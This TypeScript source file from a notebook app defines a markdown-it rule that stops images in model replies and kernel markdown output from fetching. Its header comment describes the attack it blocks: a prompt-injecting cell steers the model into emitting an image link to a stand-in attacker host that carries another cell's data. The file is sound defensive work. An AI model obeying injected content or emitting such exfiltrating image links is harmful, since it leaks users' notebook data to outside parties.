/**
 * Cellar - the ONE no-zero-click-fetch rule for MACHINE-EMITTED markdown, shared
 * by the app's renderers (`$lib/markdown`) and the HTML export's own markdown-it
 * (`server/export-html.ts`), which cannot share a sanitizer (it has no DOM).
 *
 * ## What it is for
 *
 * A `text/markdown` OUTPUT is written by a machine: a model reply, or a kernel's
 * `display(Markdown(...))`. A model reply is generated from a transcript built
 * out of cell SOURCE and stored OUTPUT, which can include content the user never
 * wrote (a downloaded notebook, an agent-written cell, a `print()` of fetched
 * data), so a prompt-injecting cell can steer the model into emitting
 * `![](https://attacker/?d=<another cell's data>)`. That is a zero-click
 * outbound GET carrying notebook data, fired the instant the cell renders and
 * again on every reload, since the reply is persisted - and, in an exported
 * report, fired in every READER's browser, which is the worse leak of the two.
 *
 * ## Why it keys on PROVENANCE, not on the cell's type
 *
 * A cell's logical type is MUTABLE (a chat cell retyped to `code` keeps its
 * outputs) and a foreign notebook's metadata is FORGEABLE - the same reason the
 * `lastRun` epoch may only ever be stamped by an in-process run. So the trusted
 * fact is not "this cell is a chat cell", it is "a `text/markdown` OUTPUT was
 * emitted by a machine, never authored by the user". Every renderer of such an
 * output installs this rule; an authored markdown CELL is a different trust
 * class and is left completely untouched.
 *
 * ## What it does
 *
 * An image renders as its alt text, or as its URL when it has none - never as a
 * fetching element, and never silently dropped. `<a>` links are untouched and
 * stay clickable: a click is deliberate, which is the whole distinction.
 *
 * ACCEPTED COST, deliberately not worked around: a kernel `Markdown()` output
 * that references a remote image no longer auto-loads it. Deliberately NOT
 * same-origin-only either - the alternative is a rule that has to be right about
 * what "same origin" means on every surface, where this one is complete.
 */

/** The minimal markdown-it token surface this rule reads. */
export interface NoFetchToken {
	content?: string;
	attrGet?(name: string): string | null;
}

/** The minimal markdown-it surface this rule writes. */
export interface NoFetchMarkdownIt {
	renderer: { rules: Record<string, unknown> };
}

/** HTML-escape a plain-text label for insertion into the rendered document. */
function escapeText(s: string): string {
	return s
		.replace(/&/g, '&amp;')
		.replace(/</g, '&lt;')
		.replace(/>/g, '&gt;')
		.replace(/"/g, '&quot;');
}

/**
 * What an image becomes: its alt text, else its URL, else nothing. `content` is
 * where markdown-it keeps the alt (the `alt` attribute is empty until its own
 * default rule fills it, so reading that instead would silently produce the URL
 * for every captioned image).
 */
export function imageFallbackText(token: NoFetchToken | undefined): string {
	const alt = (token?.content ?? '').trim();
	const src = (token?.attrGet?.('src') ?? '').trim();
	const label = alt || src;
	return label ? escapeText(label) : '';
}

/** Install the rule on a markdown-it instance that renders machine-emitted output. */
export function noFetchImages(engine: NoFetchMarkdownIt): void {
	engine.renderer.rules.image = (tokens: NoFetchToken[], idx: number) => imageFallbackText(tokens[idx]);
}
